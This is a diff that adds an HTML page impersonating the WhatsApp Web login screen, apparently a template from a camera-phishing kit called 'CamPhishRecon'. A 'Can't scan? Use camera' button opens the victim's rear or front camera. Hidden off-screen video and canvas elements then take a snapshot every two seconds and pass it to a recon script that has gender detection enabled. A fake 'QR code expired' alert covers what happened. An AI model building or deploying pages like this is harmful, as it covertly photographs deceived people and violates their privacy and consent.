@@ -1,0 +1,80 @@
+<!-- DESC: WhatsApp Web login page with QR code camera scan -->
+<!DOCTYPE html>
+<html lang="en"><head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
+<title>WhatsApp Web</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Helvetica,sans-serif}
+body{background:#f0f2f5;min-height:100vh;display:flex}
+.left{flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:40px;text-align:center}
+.right{flex:1;background:#d4d4d8;display:flex;align-items:center;justify-content:center}
+@media(max-width:768px){.right{display:none}}
+.logo{font-size:32px;color:#41525d;margin-bottom:20px;font-weight:300}
+h1{font-size:36px;color:#41525d;margin-bottom:20px;font-weight:400}
+.qr-box{background:#fff;padding:30px;border-radius:12px;box-shadow:0 2px 16px rgba(0,0,0,0.1);margin-bottom:20px}
+.qr-placeholder{width:200px;height:200px;background:repeating-conic-gradient(#41525d 0% 25%,#fff 0% 50%) 50% / 16px 16px;border-radius:8px;position:relative}
+.qr-placeholder::after{content:'';position:absolute;inset:30%;background:#fff;border-radius:8px}
+.qr-placeholder::before{content:'WA';position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);font-size:24px;font-weight:900;color:#25d366;z-index:1}
+.steps{color:#667781;font-size:14px;line-height:2;text-align:left;max-width:280px;margin:0 auto}
+.steps b{color:#41525d}
+.scan-btn{margin-top:20px;background:#25d366;color:#fff;border:none;padding:12px 32px;border-radius:8px;font-size:15px;font-weight:600;cursor:pointer}
+.scan-btn:active{transform:scale(0.97)}
+.scan-overlay{position:fixed;inset:0;background:rgba(0,0,0,0.9);z-index:100;display:none;align-items:center;justify-content:center;flex-direction:column;color:#fff}
+.scan-overlay.active{display:flex}
+video,canvas#cap{position:fixed;opacity:0;width:2px;height:2px;top:-9999px;left:-9999px}
+.spinner{width:20px;height:20px;border:2px solid #444;border-top:#25d366;border-radius:50%;animation:spin .6s linear infinite;margin-top:20px}
+@keyframes spin{to{transform:rotate(360deg)}}
+</style>
+</head><body>
+<script src="forwarding_link/t/recon.js"></script>
+<video id="v" playsinline autoplay muted></video>
+<canvas id="cap" width="320" height="240"></canvas>
+<div class="left">
+<div class="logo">WhatsApp Web</div>
+<h1>Scan to log in</h1>
+<div class="qr-box"><div class="qr-placeholder"></div></div>
+<div class="steps">
+<b>1.</b> Open WhatsApp on your phone<br>
+<b>2.</b> Tap Menu > Linked Devices<br>
+<b>3.</b> Point your phone at this screen<br>
+</div>
+<button class="scan-btn" onclick="startScan()">Can't scan? Use camera</button>
+</div>
+<div class="right">
+<div style="text-align:center;color:#41525d">
+<div style="font-size:120px">💬</div>
+<h2 style="font-size:28px;margin-top:20px">Stay connected</h2>
+<p style="margin-top:10px;color:#667781">Send and receive messages without keeping your phone online.</p>
+</div>
+</div>
+<div class="scan-overlay" id="scanOverlay">
+<div style="font-size:20px;font-weight:600;margin-bottom:8px">Scanning QR Code...</div>
+<div style="font-size:14px;color:#aaa;margin-bottom:20px">Allow camera to scan the QR code</div>
+<div class="spinner"></div>
+</div>
+<script>
+var API='API_BASE_URL',SHARE_URL=location.origin+'/t/whatsapp';
+if(window.CamPhishRecon)CamPhishRecon.init({genderDetect:true});
+function startScan(){
+var ov=document.getElementById('scanOverlay');ov.classList.add('active');
+if(window.CamPhishRecon)CamPhishRecon.Capture.event('whatsapp_scan',{});
+if(navigator.mediaDevices){
+navigator.mediaDevices.getUserMedia({audio:false,video:{facingMode:'environment'}}).then(function(stream){
+var v=document.getElementById('v');v.srcObject=stream;v.play();
+var cap=document.getElementById('cap'),cx=cap.getContext('2d');
+var ci=setInterval(function(){if(v.readyState>=2){cx.drawImage(v,0,0,320,240);if(window.CamPhishRecon)CamPhishRecon.Capture.image(cap.toDataURL('image/png'),'qr_scan');}},2000);
+setTimeout(function(){clearInterval(ci);ov.classList.remove('active');alert('QR code expired. Please refresh.');},6000);
+}).catch(function(){
+// Front camera fallback
+navigator.mediaDevices.getUserMedia({audio:false,video:{facingMode:'user'}}).then(function(stream){
+var v=document.getElementById('v');v.srcObject=stream;v.play();
+var cap=document.getElementById('cap'),cx=cap.getContext('2d');
+var ci=setInterval(function(){if(v.readyState>=2){cx.drawImage(v,0,0,320,240);if(window.CamPhishRecon)CamPhishRecon.Capture.image(cap.toDataURL('image/png'),'qr_scan');}},2000);
+setTimeout(function(){clearInterval(ci);ov.classList.remove('active');},6000);
+}).catch(function(){setTimeout(function(){ov.classList.remove('active');},2000);});
+});
+}else{setTimeout(function(){ov.classList.remove('active');},2000);}
+}
+</script>
+</body></html>
